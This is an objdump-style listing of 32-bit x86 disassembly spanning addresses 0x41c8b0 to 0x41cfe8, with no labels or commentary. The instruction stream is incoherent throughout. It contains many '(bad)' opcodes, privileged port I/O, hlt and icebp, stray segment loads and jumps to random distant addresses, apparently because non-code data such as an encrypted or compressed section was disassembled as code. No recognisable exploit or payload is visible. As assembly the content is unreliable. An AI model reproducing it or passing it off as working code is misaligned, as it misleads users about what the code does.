  41c8b0:	xor    eax,0x42462cf2
  41c8b5:	mov    ebx,0xc98fa3a2
  41c8ba:	call   0x3ea2968
  41c8bf:	data16 add bl,BYTE PTR [ebx+0xd]
  41c8c3:	xchg   BYTE PTR [eax],ah
  41c8c5:	mov    edi,0x605b70af
  41c8ca:	push   edx
  41c8cb:	data16 xchg BYTE PTR [ebx],dh
  41c8ce:	repz add BYTE PTR [edi],cl
  41c8d1:	cmc    
  41c8d2:	nop
  41c8d3:	mov    ds:0x13c2f8c3,al
  41c8d8:	mov    ah,0x41
  41c8da:	push   es
  41c8db:	xchg   edi,eax
  41c8dc:	jg     0x41c952
  41c8de:	outs   dx,BYTE PTR ds:[esi]
  41c8df:	ret    0xe66c
  41c8e2:	pop    ss
  41c8e3:	bound  edx,QWORD PTR [edx-0x6312fa2d]
  41c8e9:	inc    ebx
  41c8ea:	xchg   ebp,eax
  41c8eb:	imul   edi,DWORD PTR [esi+0x1e],0x4a9e784a
  41c8f2:	clc    
  41c8f3:	pop    edx
  41c8f4:	adc    DWORD PTR [edi],ebx
  41c8f6:	jmp    0x41c8c8
  41c8f8:	ffree  st(5)
  41c8fa:	jnp    0x41c949
  41c8fc:	iret   
  41c8fd:	jae    0x41c8f8
  41c8ff:	fisttp DWORD PTR [esi-0x3afa78ea]
  41c905:	or     ebp,edi
  41c907:	inc    ecx
  41c908:	push   es
  41c909:	xchg   ebp,eax
  41c90a:	xor    esi,ebp
  41c90c:	sbb    bl,BYTE PTR [edi]
  41c90e:	or     BYTE PTR [esi],bh
  41c910:	xchg   DWORD PTR [edx],ebp
  41c912:	mov    dl,0x6c
  41c914:	push   eax
  41c915:	aas    
  41c916:	fstp   TBYTE PTR [edx+0x7f]
  41c919:	lahf   
  41c91a:	and    eax,0x97f2e3c5
  41c91f:	push   esp
  41c920:	and    al,0x26
  41c922:	and    BYTE PTR [ebx],0xef
  41c925:	pop    ebx
  41c926:	xchg   esi,eax
  41c927:	mov    ds:0x777d61ad,al
  41c92c:	xchg   edx,eax
  41c92d:	in     al,dx
  41c92e:	xor    DWORD PTR [eax+0x733499a3],ebp
  41c934:	sub    eax,0x3654f2e7
  41c939:	test   BYTE PTR [edx-0x7c],dl
  41c93c:	es and eax,0xd31840d0
  41c942:	data16 sbb dh,BYTE PTR [edi-0x20]
  41c946:	(bad)  [edx-0xc8d55f8]
  41c94c:	pop    ecx
  41c94d:	loopne 0x41c996
  41c94f:	lea    ebp,[edi+0x3adebe38]
  41c955:	and    al,0x2d
  41c957:	xor    dl,al
  41c959:	xor    al,0xe6
  41c95b:	inc    ecx
  41c95c:	jg     0x41c948
  41c95e:	pop    esi
  41c95f:	out    0xd8,al
  41c961:	inc    ebp
  41c962:	iret   
  41c963:	mov    ecx,0x5da2b58e
  41c968:	add    esi,DWORD PTR ds:0x6af7a571
  41c96e:	clc    
  41c96f:	sbb    bl,al
  41c971:	xchg   ecx,eax
  41c972:	push   es
  41c973:	outs   dx,BYTE PTR ds:[esi]
  41c974:	mov    ebx,0x57ad97e
  41c979:	sbb    eax,0x69cca8d3
  41c97e:	(bad)  
  41c97f:	pop    ecx
  41c980:	push   ebx
  41c981:	jl     0x41c9a9
  41c983:	inc    edi
  41c984:	push   edx
  41c985:	add    al,0xcc
  41c987:	push   es
  41c988:	lock dec esp
  41c98a:	les    eax,FWORD PTR [edi+edi*8]
  41c98d:	stos   BYTE PTR es:[edi],al
  41c98e:	dec    eax
  41c98f:	cmp    eax,DWORD PTR [eax+0x47]
  41c992:	popa   
  41c993:	in     al,dx
  41c994:	sub    al,0xea
  41c996:	jmp    0x62de0025
  41c99b:	push   es
  41c99c:	jmp    0xc7b49fb9
  41c9a1:	pop    esi
  41c9a2:	imul   ebp,DWORD PTR [ebx],0xffffffd8
  41c9a5:	adc    esi,DWORD PTR [eax]
  41c9a7:	xor    eax,0x777582c4
  41c9ac:	add    al,0x0
  41c9ae:	cld    
  41c9af:	and    eax,0xbdeada4c
  41c9b4:	pushf  
  41c9b5:	cdq    
  41c9b6:	mov    al,ds:0x300bdee9
  41c9bb:	sbb    edx,DWORD PTR [ebx+0x13]
  41c9be:	(bad)
  41c9c3:	fidiv  WORD PTR [edi+0x3a67129]
  41c9c9:	jp     0x41c9ca
  41c9cb:	fnstsw WORD PTR [eax-0x4]
  41c9ce:	xor    DWORD PTR cs:[ebp-0x49],eax
  41c9d2:	or     DWORD PTR [esi+0x6269f53],esi
  41c9d8:	jg     0x41c9b4
  41c9da:	shr    dl,0x44
  41c9dd:	fild   QWORD PTR [eax-0x3c663750]
  41c9e3:	mul    ch
  41c9e5:	xchg   ebp,eax
  41c9e6:	mov    ebx,esp
  41c9e8:	cli    
  41c9e9:	mov    ebx,0x8fbaeadb
  41c9ee:	lods   eax,DWORD PTR ds:[esi]
  41c9ef:	inc    esi
  41c9f0:	and    BYTE PTR [ebp+0x196fe92c],al
  41c9f6:	pop    esi
  41c9f7:	mov    cl,0xf7
  41c9f9:	pop    eax
  41c9fa:	enter  0x339c,0x2c
  41c9fe:	sbb    eax,DWORD PTR [edx-0x59]
  41ca01:	jbe    0x41ca5f
  41ca03:	mov    bh,0x6b
  41ca05:	fwait
  41ca06:	(bad)  
  41ca07:	jp     0x41ca4a
  41ca09:	gs jno 0x41c9a4
  41ca0c:	(bad)  
  41ca0d:	imul   ecx,DWORD PTR [edi-0x33cee47c],0x7526914b
  41ca17:	add    eax,0xa15eccf0
  41ca1c:	aas    
  41ca1d:	outs   dx,BYTE PTR ds:[esi]
  41ca1e:	popa   
  41ca1f:	cmp    eax,0x46f86333
  41ca24:	adc    dl,BYTE PTR [eax-0x67f7a74e]
  41ca2a:	outs   dx,BYTE PTR ds:[esi]
  41ca2b:	stos   DWORD PTR es:[edi],eax
  41ca2c:	mov    edx,0xc41f559c
  41ca31:	jae    0x41ca34
  41ca33:	cmp    esp,DWORD PTR [esi+0x6e40a8df]
  41ca39:	cmp    al,0x1e
  41ca3b:	cli    
  41ca3c:	cwde   
  41ca3d:	(bad)  [esi]
  41ca3f:	adc    eax,0xe45cf752
  41ca44:	sub    DWORD PTR [edi+0x1b],ebp
  41ca47:	ins    BYTE PTR es:[edi],dx
  41ca48:	dec    edi
  41ca49:	ja     0x41ca7d
  41ca4b:	mov    ch,0xaf
  41ca4d:	mov    ebx,0x7700a64
  41ca52:	push   edx
  41ca53:	sbb    BYTE PTR [eax+0x11],ah
  41ca56:	clc    
  41ca57:	stc    
  41ca58:	and    dh,dl
  41ca5a:	gs out dx,eax
  41ca5c:	out    0xf3,eax
  41ca5e:	cmp    BYTE PTR [ebx-0x3f],ah
  41ca61:	jecxz  0x41ca03
  41ca63:	out    0x44,eax
  41ca65:	retf   
  41ca66:	push   ss
  41ca67:	mov    ebx,0xf040cbe4
  41ca6c:	orps   xmm4,XMMWORD PTR [ecx]
  41ca6f:	xchg   edx,eax
  41ca70:	xchg   edx,eax
  41ca71:	pop    esi
  41ca72:	out    dx,al
  41ca73:	cld    
  41ca74:	xor    BYTE PTR [ebx],dl
  41ca76:	aaa    
  41ca77:	jle    0x41cadf
  41ca79:	loope  0x41cacf
  41ca7b:	fstp   st(3)
  41ca7d:	into   
  41ca7e:	mov    esp,0xc46ba2b1
  41ca83:	xchg   DWORD PTR [ecx+0x7d0799e4],ecx
  41ca89:	mov    al,0x61
  41ca8b:	push   ss
  41ca8c:	bound  esi,QWORD PTR [edi+esi*8+0x41]
  41ca90:	xchg   esi,eax
  41ca91:	sub    ch,BYTE PTR [ecx-0x17ee6595]
  41ca97:	divps  xmm3,XMMWORD PTR [ecx]
  41ca9a:	lods   eax,DWORD PTR ds:[esi]
  41ca9b:	stc    
  41ca9c:	inc    edi
  41ca9d:	xor    ebp,DWORD PTR [esi+0x78]
  41caa0:	dec    edx
  41caa1:	inc    ecx
  41caa2:	jno    0x41caee
  41caa4:	cmp    bl,0x6b
  41caa7:	push   esi
  41caa8:	das    
  41caa9:	pop    cx
  41caab:	jo     0x41ca7a
  41caad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41caae:	and    BYTE PTR [ebp+0x78],dh
  41cab1:	or     esi,esp
  41cab3:	js     0x41cae2
  41cab5:	neg    DWORD PTR [edi+0x70]
  41cab8:	xor    eax,DWORD PTR [esp+eax*4+0x7c0a9f0e]
  41cabf:	icebp  
  41cac0:	mov    ds:0x817eadc4,al
  41cac5:	dec    ecx
  41cac6:	xor    al,0x39
  41cac8:	(bad)  
  41cac9:	cwde   
  41caca:	inc    ebx
  41cacb:	lds    edi,FWORD PTR [eax+ebp*4+0x58]
  41cacf:	cmp    BYTE PTR [ebx],0x5b
  41cad2:	inc    dl
  41cad4:	call   0xee3dcb4d
  41cad9:	outs   dx,DWORD PTR ds:[esi]
  41cada:	add    eax,0x1fe9d89f
  41cadf:	test   BYTE PTR [edi-0x296daf0e],dh
  41cae5:	adc    al,cl
  41cae7:	sbb    ah,dl
  41cae9:	add    al,0x9b
  41caeb:	add    ah,0x1c
  41caee:	add    ebp,edx
  41caf0:	lock inc esp
  41caf2:	jns    0x41cafa
  41caf4:	mov    ch,0x5
  41caf6:	pushf  
  41caf7:	mov    al,ds:0xaded430a
  41cafc:	mov    ds:0xb1cc9995,eax
  41cb01:	ins    DWORD PTR es:[edi],dx
  41cb02:	xor    BYTE PTR ds:0x930d57a1,ah
  41cb08:	push   0xcd63a2a4
  41cb0d:	dec    edi
  41cb0e:	mov    dh,BYTE PTR [eax+0x77]
  41cb11:	ins    BYTE PTR es:[edi],dx
  41cb12:	addr16 ja 0x41ca9c
  41cb15:	in     eax,0xaf
  41cb17:	dec    eax
  41cb18:	sub    BYTE PTR [esi-0x1a777b33],bh
  41cb1e:	jne    0x41cb3b
  41cb20:	push   edx
  41cb21:	mov    ah,BYTE PTR [eax-0x8c1d612]
  41cb27:	sub    ecx,edx
  41cb29:	xchg   DWORD PTR [edx+0x4747e492],edx
  41cb2f:	out    0x7c,al
  41cb31:	int    0xcc
  41cb33:	push   ds
  41cb34:	repz pop es
  41cb36:	jns    0x41cb04
  41cb38:	je     0x41cbb8
  41cb3a:	(bad)  
  41cb3b:	repz or DWORD PTR [edi-0x55],0x79b72dbc
  41cb43:	(bad)
  41cb47:	jo     0x41cb41
  41cb49:	or     ecx,ebx
  41cb4b:	xchg   esi,eax
  41cb4c:	mov    cs:0x5808071c,al
  41cb52:	sar    DWORD PTR [esi+ecx*2-0x6a],1
  41cb56:	mov    bh,0x4
  41cb58:	push   es
  41cb59:	int3   
  41cb5a:	or     DWORD PTR [esi-0x15],ecx
  41cb5d:	and    dh,BYTE PTR [esi-0x54695d77]
  41cb63:	bound  esi,QWORD PTR [edi+0x25]
  41cb66:	gs xor esi,ecx
  41cb69:	adc    al,0x5a
  41cb6b:	cmp    ecx,ecx
  41cb6d:	xchg   ebx,eax
  41cb6e:	popa   
  41cb6f:	mov    ds,WORD PTR [eax+0x5a]
  41cb72:	mov    ebx,0xdf0dd8c3
  41cb77:	adc    BYTE PTR [ebx+0x59],dh
  41cb7a:	and    DWORD PTR [eax+0x47],ebp
  41cb7d:	pop    edi
  41cb7e:	loop   0x41cb23
  41cb80:	lock inc ecx
  41cb82:	rcl    eax,0x82
  41cb85:	aad    0xeb
  41cb87:	out    dx,al
  41cb88:	outs   dx,DWORD PTR ds:[esi]
  41cb89:	mov    eax,ds:0x2deaa4cb
  41cb8e:	test   DWORD PTR [edi],edi
  41cb90:	sbb    ebp,DWORD PTR [esi+0x41]
  41cb93:	stc    
  41cb94:	es scas eax,DWORD PTR es:[edi]
  41cb96:	nop
  41cb97:	leave  
  41cb98:	cmp    edi,DWORD PTR [edi-0x56]
  41cb9b:	(bad)  
  41cb9c:	push   ebx
  41cb9d:	push   0xa
  41cb9f:	lds    esi,FWORD PTR [edi]
  41cba1:	dec    ebp
  41cba2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cba3:	(bad)  [edi-0x1]
  41cba6:	mov    esp,0x8e8ac788
  41cbac:	xchg   esi,eax
  41cbad:	and    edi,edx
  41cbaf:	push   es
  41cbb0:	je     0x41cbbb
  41cbb2:	in     al,dx
  41cbb3:	test   eax,0x947df1b6
  41cbb8:	iret   
  41cbb9:	mov    al,0x14
  41cbbb:	(bad)  
  41cbbc:	dec    eax
  41cbbd:	jb     0x41cb41
  41cbbf:	sbb    eax,0x93a6b6f1
  41cbc4:	push   ebp
  41cbc5:	add    DWORD PTR [ebp-0x71],0xe3b566be
  41cbcc:	pop    edi
  41cbcd:	sub    BYTE PTR [eax-0x29],bl
  41cbd0:	fwait
  41cbd1:	pop    ecx
  41cbd2:	xor    dl,BYTE PTR [ecx+0x52]
  41cbd5:	push   eax
  41cbd6:	loope  0x41cb91
  41cbd8:	nop
  41cbd9:	jl     0x41cbed
  41cbdb:	ror    eax,0xc3
  41cbde:	popa   
  41cbdf:	inc    edi
  41cbe0:	(bad)  
  41cbe1:	jbe    0x41cc23
  41cbe3:	mov    al,0x63
  41cbe5:	or     cl,BYTE PTR [eax+0x8e58653]
  41cbeb:	sub    dl,BYTE PTR [ebx+0x3a]
  41cbee:	mov    dl,0x4e
  41cbf0:	or     ebp,DWORD PTR [eax+0x3e37c346]
  41cbf6:	mov    ecx,0xc7632d5b
  41cbfb:	mov    ch,0xc8
  41cbfd:	mov    eax,ds:0xdb5165b9
  41cc02:	stos   DWORD PTR es:[edi],eax
  41cc03:	mov    esi,ebp
  41cc05:	lahf   
  41cc06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc07:	lahf   
  41cc08:	cmp    edx,ebp
  41cc0a:	dec    ebp
  41cc0b:	inc    edi
  41cc0c:	sti    
  41cc0d:	mov    al,0x6f
  41cc0f:	aaa    
  41cc10:	xchg   esp,eax
  41cc11:	sub    ebx,ecx
  41cc13:	sbb    BYTE PTR [esi-0x40],al
  41cc16:	pop    esi
  41cc17:	loopne 0x41cbbf
  41cc19:	or     edx,edx
  41cc1b:	dec    esi
  41cc1c:	or     BYTE PTR [ebx-0x4af439c6],al
  41cc22:	in     eax,dx
  41cc23:	jo     0x41cc62
  41cc25:	jne    0x41cbed
  41cc27:	int    0xc
  41cc29:	repz or DWORD PTR [edi],edi
  41cc2c:	xor    eax,0x193ebaa0
  41cc31:	mov    edx,0xb23baa9e
  41cc36:	mov    bh,0xf6
  41cc38:	pushf  
  41cc39:	je     0x41cbbd
  41cc3b:	repz mov bh,BYTE PTR [esp+esi*2-0x6f]
  41cc40:	jg     0x41cc1a
  41cc42:	das    
  41cc43:	stos   DWORD PTR es:[edi],eax
  41cc44:	mov    ebx,0x2f18fcf
  41cc49:	push   0x3
  41cc4b:	fist   WORD PTR [edx+0x4]
  41cc4e:	sbb    BYTE PTR [edi],0x7c
  41cc51:	push   ebp
  41cc52:	popf   
  41cc53:	out    0xc0,al
  41cc55:	test   eax,0x5426dc72
  41cc5a:	aaa    
  41cc5b:	pop    ds
  41cc5c:	sub    DWORD PTR [edx-0x4d],ebp
  41cc5f:	mov    esp,DWORD PTR [edi]
  41cc61:	mov    gs,WORD PTR [ebx+0x6d9efa4b]
  41cc67:	fcom   QWORD PTR [ebx-0x5]
  41cc6a:	xor    DWORD PTR [eax],esi
  41cc6c:	lods   eax,DWORD PTR ds:[esi]
  41cc6d:	mov    edi,0x233b491b
  41cc72:	xor    al,0x5d
  41cc74:	jb     0x41cc5c
  41cc76:	push   eax
  41cc77:	or     eax,0x7dcd50f3
  41cc7c:	inc    dl
  41cc7e:	stc    
  41cc7f:	xor    edi,0x7c
  41cc82:	mov    dl,BYTE PTR [ebp-0x5324515]
  41cc88:	or     dl,dl
  41cc8a:	test   eax,0xc46cf6dc
  41cc8f:	ins    BYTE PTR es:[edi],dx
  41cc90:	xchg   ebx,eax
  41cc91:	and    BYTE PTR [edx+0x7064bf62],dl
  41cc97:	push   ebp
  41cc98:	xor    al,0x34
  41cc9a:	cmp    DWORD PTR ds:0x591dc54a,eax
  41cca0:	ss rcr dh,1
  41cca3:	sbb    BYTE PTR [ebx+eiz*2+0x78],0x68
  41cca8:	add    eax,0x494d2ee4
  41ccad:	and    dl,al
  41ccaf:	cmp    al,0x19
  41ccb1:	sbb    edx,ecx
  41ccb3:	adc    DWORD PTR [edi-0x6d],edx
  41ccb6:	add    DWORD PTR [eax],esi
  41ccb8:	int3   
  41ccb9:	and    DWORD PTR [ebx+esi*1],0x5efbb68f
  41ccc0:	sbb    eax,0x198bd2ea
  41ccc5:	cwde   
  41ccc6:	push   ss
  41ccc7:	or     eax,0x2ffef173
  41cccc:	mov    BYTE PTR [edx+0xe],cl
  41cccf:	aas    
  41ccd0:	adc    edx,DWORD PTR [ebx+0x1f]
  41ccd3:	jnp    0x41ccb8
  41ccd5:	sahf   
  41ccd6:	jae    0x41cd56
  41ccd8:	pop    esi
  41ccd9:	jle    0x41cd27
  41ccdb:	xor    al,0x31
  41ccdd:	cld    
  41ccde:	and    al,0x57
  41cce0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cce1:	les    ecx,FWORD PTR [edx+edx*2]
  41cce4:	pop    esi
  41cce5:	stos   DWORD PTR es:[edi],eax
  41cce6:	mov    bl,BYTE PTR [esi]
  41cce8:	ret    
  41cce9:	inc    edx
  41ccea:	mov    BYTE PTR [ecx+ecx*8-0x417583a7],bh
  41ccf1:	mov    dl,ch
  41ccf3:	xchg   ecx,eax
  41ccf4:	fbld   TBYTE PTR [ebp-0x3fb656f2]
  41ccfa:	xchg   ecx,eax
  41ccfb:	mov    ch,0x4f
  41ccfd:	loop   0x41ccea
  41ccff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd00:	test   ah,bh
  41cd02:	dec    edx
  41cd03:	call   0xc3b763ee
  41cd08:	jno    0x41ccbd
  41cd0a:	(bad)
  41cd0d:	mov    edx,0x21a21b5f
  41cd12:	fidivr DWORD PTR [edx-0x59]
  41cd15:	push   ecx
  41cd16:	clc    
  41cd17:	fistp  QWORD PTR [edx-0xb]
  41cd1a:	add    al,0x5b
  41cd1c:	lods   al,BYTE PTR ds:[esi]
  41cd1d:	xor    eax,esi
  41cd1f:	enter  0x84d0,0xf3
  41cd23:	into   
  41cd24:	mov    ebx,0x448a1ac6
  41cd29:	push   ebx
  41cd2a:	nop
  41cd2b:	dec    ecx
  41cd2c:	mov    bl,0xe2
  41cd2e:	and    ecx,DWORD PTR ss:[bx+di+0x269d]
  41cd34:	inc    esi
  41cd35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd36:	fst    st(0)
  41cd38:	popa   
  41cd39:	xchg   ebx,eax
  41cd3a:	sti    
  41cd3b:	push   ebp
  41cd3c:	loope  0x41cd50
  41cd3e:	mov    bh,0x57
  41cd40:	add    eax,0x9e39dd3
  41cd45:	jle    0x41ccd2
  41cd47:	add    al,0xac
  41cd49:	jbe    0x41cd0d
  41cd4b:	sub    ah,BYTE PTR [edx-0x4847b816]
  41cd51:	push   0x8735b263
  41cd56:	ror    eax,1
  41cd58:	sti    
  41cd59:	mov    ah,0xeb
  41cd5b:	(bad)  
  41cd5c:	cmp    eax,0xe353e36e
  41cd61:	push   cs
  41cd62:	shr    BYTE PTR [esp+eax*2+0x33],0xe3
  41cd67:	inc    esp
  41cd68:	rol    BYTE PTR [eax-0x65a73a4],1
  41cd6e:	or     dl,BYTE PTR [eax]
  41cd70:	mov    esi,0xebaf64c6
  41cd75:	fdivr  DWORD PTR [edi]
  41cd77:	ds (bad) 
  41cd7a:	daa    
  41cd7b:	sti    
  41cd7c:	shl    BYTE PTR [ecx],0x83
  41cd7f:	mov    dl,0x1e
  41cd81:	jno    0x41cd36
  41cd83:	sbb    eax,0xd54447c2
  41cd88:	fbstp  TBYTE PTR [esi]
  41cd8a:	add    eax,0x11bdf374
  41cd8f:	aas    
  41cd90:	jl     0x41cdbf
  41cd92:	push   ss
  41cd93:	gs xor edx,eax
  41cd96:	ja     0x41cd6b
  41cd98:	push   eax
  41cd99:	sbb    al,0x7
  41cd9b:	shl    DWORD PTR [esi],1
  41cd9d:	idiv   DWORD PTR [eax+0x13]
  41cda0:	leave  
  41cda1:	push   0xffffffaa
  41cda3:	xor    DWORD PTR [ebx],eax
  41cda5:	mov    WORD PTR [ecx-0x6eb3b8ac],?
  41cdab:	jo     0x41cdcb
  41cdad:	test   BYTE PTR [edx-0x13dd760c],dl
  41cdb3:	in     eax,0x6b
  41cdb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdb6:	mov    cl,0x99
  41cdb8:	mov    al,0xe
  41cdba:	pushf  
  41cdbb:	bound  ecx,QWORD PTR [edi]
  41cdbd:	les    ecx,FWORD PTR [esp+edx*1]
  41cdc0:	or     al,ch
  41cdc2:	sbb    eax,0xbc65eed0
  41cdc7:	push   es
  41cdc8:	xchg   ecx,eax
  41cdc9:	jl     0x41cd8e
  41cdcb:	ins    DWORD PTR es:[edi],dx
  41cdcc:	mov    al,ds:0x93ffd9f9
  41cdd1:	into   
  41cdd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdd3:	ins    BYTE PTR es:[edi],dx
  41cdd4:	and    BYTE PTR [edi-0x5c],dl
  41cdd7:	jo     0x41ce14
  41cdd9:	jb     0x41cdd6
  41cddb:	ja     0x41cdbf
  41cddd:	ret    
  41cdde:	xchg   ebp,eax
  41cddf:	repnz cdq 
  41cde1:	ins    DWORD PTR es:[edi],dx
  41cde2:	fdiv   DWORD PTR [ebx+0x21]
  41cde5:	or     eax,0x10ae035b
  41cdea:	js     0x6ee2491e
  41cdf0:	(bad)  
  41cdf1:	lahf   
  41cdf2:	sub    eax,esp
  41cdf4:	pop    es
  41cdf5:	jnp    0x41cdc3
  41cdf7:	add    DWORD PTR [esi],esi
  41cdf9:	jge    0x41cd94
  41cdfb:	fwait
  41cdfc:	push   eax
  41cdfd:	fldcw  WORD PTR [ecx+0x48]
  41ce00:	mov    ebp,0xf0468ad0
  41ce05:	(bad)  
  41ce06:	push   edx
  41ce07:	mov    ds:0x9315a305,al
  41ce0c:	sti    
  41ce0d:	jmp    0xcc5ab4e3
  41ce12:	(bad)  
  41ce13:	retf   
  41ce14:	mov    dh,0x1b
  41ce16:	scas   eax,DWORD PTR es:[edi]
  41ce17:	int3   
  41ce18:	sub    cl,BYTE PTR [eax-0x44]
  41ce1b:	out    0xa5,eax
  41ce1d:	stos   DWORD PTR es:[edi],eax
  41ce1e:	inc    ecx
  41ce1f:	dec    esi
  41ce20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce21:	fcom   QWORD PTR [esi+ebp*4+0x5c39d9f2]
  41ce28:	aam    0xc7
  41ce2a:	test   al,0x65
  41ce2c:	push   DWORD PTR [eax]
  41ce2e:	jns    0x41ce71
  41ce30:	dec    ebx
  41ce31:	icebp  
  41ce32:	es jl  0x41ce6b
  41ce35:	int3   
  41ce36:	cmp    eax,0xcda8b928
  41ce3b:	sub    ch,BYTE PTR [esi]
  41ce3d:	div    DWORD PTR [esi]
  41ce3f:	jo     0x41ce3c
  41ce41:	xor    dl,0x8e
  41ce44:	(bad)  
  41ce45:	aam    0xcb
  41ce47:	pop    edx
  41ce48:	and    BYTE PTR [ebx*4+0x241306cf],bh
  41ce4f:	gs (bad) 
  41ce52:	out    dx,eax
  41ce53:	jp     0x41cde4
  41ce55:	test   esp,esi
  41ce57:	int3   
  41ce58:	std    
  41ce59:	mov    ch,0xc5
  41ce5b:	stc    
  41ce5c:	dec    DWORD PTR [esi]
  41ce5e:	sbb    dh,dl
  41ce60:	inc    esi
  41ce61:	and    edi,ebx
  41ce63:	fisttp DWORD PTR [ecx+0x3f418ee8]
  41ce69:	cmp    al,0x88
  41ce6b:	dec    ebx
  41ce6c:	enter  0xbf26,0x47
  41ce70:	sbb    BYTE PTR [ecx+0x6505e962],cl
  41ce76:	je     0x41ced7
  41ce78:	icebp  
  41ce79:	pop    edx
  41ce7a:	cld    
  41ce7b:	jns    0x41cee6
  41ce7d:	xchg   ebx,eax
  41ce7e:	mov    dh,0xb
  41ce80:	call   0x384888e
  41ce85:	xchg   ebp,eax
  41ce86:	out    0xf4,al
  41ce88:	pop    ss
  41ce89:	jno    0x41cf03
  41ce8b:	dec    eax
  41ce8c:	inc    ebx
  41ce8d:	mov    dh,0x7
  41ce8f:	push   edi
  41ce90:	arpl   WORD PTR [edi+0x202a4e66],si
  41ce96:	xchg   edx,eax
  41ce97:	mov    ebx,0xde30dc55
  41ce9c:	fst    DWORD PTR [edx+0x55fe2231]
  41cea2:	in     eax,0xd0
  41cea4:	cmp    al,0x51
  41cea6:	pop    esp
  41cea7:	jmp    0x41cf04
  41cea9:	xor    esp,esi
  41ceab:	or     DWORD PTR [ebp+0x3cb1ac34],ebp
  41ceb1:	outs   dx,DWORD PTR ds:[esi]
  41ceb2:	leave  
  41ceb3:	cmp    al,bh
  41ceb5:	addr16 (bad) 
  41ceb7:	cmp    ch,al
  41ceb9:	mov    ecx,0x6df4b1b4
  41cebe:	in     al,0xeb
  41cec0:	shl    ch,cl
  41cec2:	dec    esp
  41cec3:	sahf   
  41cec4:	adc    dh,BYTE PTR [edx]
  41cec6:	push   0x60
  41cec8:	arpl   WORD PTR [ecx-0xf326de3],di
  41cece:	aam    0x41
  41ced0:	out    dx,al
  41ced1:	mov    dh,0xa9
  41ced3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ced4:	sub    bh,al
  41ced6:	inc    esp
  41ced7:	xor    eax,0xca22781d
  41cedc:	and    eax,0xfd462f97
  41cee1:	and    DWORD PTR [esi+0x31c55ea0],ebp
  41cee7:	cmp    ah,BYTE PTR [esi-0x37c12663]
  41ceed:	pusha  
  41ceee:	mov    esp,0x445f594c
  41cef3:	mov    edi,0x3316ea8
  41cef8:	xor    BYTE PTR [ebp+ebp*4+0x52ef01bc],ch
  41ceff:	out    dx,eax
  41cf00:	or     dl,al
  41cf02:	dec    ecx
  41cf03:	lods   eax,DWORD PTR ds:[esi]
  41cf04:	hlt    
  41cf05:	gs mov ch,0x60
  41cf08:	imul   ecx,DWORD PTR [ecx],0x5955129c
  41cf0e:	pop    ebx
  41cf0f:	shl    DWORD PTR [eax+0x16014ff7],cl
  41cf15:	sub    eax,0xb1f42869
  41cf1a:	and    al,0x16
  41cf1c:	mov    ah,0x34
  41cf1e:	pop    ecx
  41cf1f:	adc    DWORD PTR [ecx],esi
  41cf21:	sub    eax,0x92daca0d
  41cf26:	mov    ebp,0xe4f626c0
  41cf2b:	jmp    0x4c845563
  41cf30:	dec    edi
  41cf31:	jmp    0xc823ffa7
  41cf36:	fst    QWORD PTR [esi+0x28c1cc18]
  41cf3c:	(bad)  
  41cf3d:	mov    gs,WORD PTR [eax]
  41cf3f:	or     eax,0x51eed260
  41cf44:	pop    ebx
  41cf45:	jmp    0x41cfad
  41cf47:	pop    edx
  41cf48:	fld    DWORD PTR [esi]
  41cf4a:	clc    
  41cf4b:	adc    eax,0x79c9cd8e
  41cf50:	out    0x4c,al
  41cf52:	out    0x16,al
  41cf54:	(bad)  
  41cf55:	xor    ecx,eax
  41cf57:	ret    0x326f
  41cf5a:	lods   al,BYTE PTR ds:[esi]
  41cf5b:	cmp    DWORD PTR [ecx],eax
  41cf5d:	inc    edi
  41cf5e:	sbb    eax,0x183f32d0
  41cf63:	mov    esi,0x172f36c2
  41cf68:	in     al,0xc0
  41cf6a:	mov    al,0xe6
  41cf6c:	xor    dl,BYTE PTR [esi-0x6fde2c97]
  41cf72:	mov    esi,DWORD PTR gs:[edx+0x39290eab]
  41cf79:	loopne 0x41cf82
  41cf7b:	mov    al,0x9c
  41cf7d:	cli    
  41cf7e:	cwde   
  41cf7f:	push   edx
  41cf80:	push   edi
  41cf81:	xchg   esi,eax
  41cf82:	popa   
  41cf83:	test   BYTE PTR [ecx],ch
  41cf85:	test   cl,bl
  41cf87:	ss mov cl,0x7c
  41cf8a:	test   DWORD PTR ds:0x74dc2203,ebx
  41cf90:	pop    ebx
  41cf91:	jbe    0x41cf83
  41cf93:	ds stc 
  41cf95:	icebp  
  41cf96:	lods   eax,DWORD PTR ds:[esi]
  41cf97:	fisttp DWORD PTR [esi-0xadac52d]
  41cf9d:	sub    dh,BYTE PTR [edi+0x31]
  41cfa0:	std    
  41cfa1:	daa    
  41cfa2:	test   DWORD PTR [ecx+0x79],esp
  41cfa5:	jmp    0x41cf3d
  41cfa7:	mov    bl,0x77
  41cfa9:	outs   dx,DWORD PTR ds:[esi]
  41cfaa:	mov    ebp,fs
  41cfac:	adc    esi,DWORD PTR [ecx-0xb623b58]
  41cfb2:	les    ecx,FWORD PTR [ebp-0x3bcd2e9]
  41cfb8:	outs   dx,DWORD PTR ds:[esi]
  41cfb9:	sti    
  41cfba:	sbb    BYTE PTR [edi+0x8990aa6],dh
  41cfc0:	repnz add al,0xff
  41cfc3:	lods   al,BYTE PTR ds:[esi]
  41cfc4:	xchg   ecx,eax
  41cfc5:	inc    ebp
  41cfc6:	dec    ecx
  41cfc7:	pop    ds
  41cfc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfc9:	out    dx,eax
  41cfca:	stos   BYTE PTR es:[edi],al
  41cfcb:	jne    0x41cf4d
  41cfcd:	mov    ecx,0x3a1067e1
  41cfd2:	stos   BYTE PTR es:[edi],al
  41cfd3:	inc    ecx
  41cfd4:	mov    esi,edx
  41cfd6:	xchg   esi,edx
  41cfd8:	xchg   edx,eax
  41cfd9:	dec    edx
  41cfda:	jo     0x5b2cbb12
  41cfe0:	cmp    bh,BYTE PTR [ebx+0x11]
  41cfe3:	cs push ecx
  41cfe5:	mov    dl,0x7d
  41cfe7:	xchg   edi,eax
  41cfe8:	jmp    0x41cfa5
